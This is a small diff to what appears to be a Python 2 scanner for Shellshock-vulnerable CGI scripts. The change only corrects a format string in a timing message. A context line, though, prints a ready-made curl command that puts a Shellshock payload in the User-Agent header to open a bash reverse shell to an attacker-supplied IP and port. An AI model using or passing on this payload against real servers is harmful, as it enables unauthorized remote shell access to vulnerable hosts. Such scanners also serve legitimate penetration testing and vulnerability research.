@@ -74,7 +74,7 @@ stop = time.time()*1000
 if vlns > 0:
   print "\r\b[*] Found %i vulnerable scripts in %i ms." %(vlns, int(stop-start))
 else:
-  print "\r\b[*] Found %i candidate(s) in % ms." %(hits, int(stop-start))
+  print "\r\b[*] Found %i candidate(s) in %i ms." %(hits, int(stop-start))
 
 if hits > 0:
   print "\n[*] Try something like: \n[*] $ curl -H \"User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1;'\" %s://%s:%i%s" %(url.scheme, url.hostname, port, script)
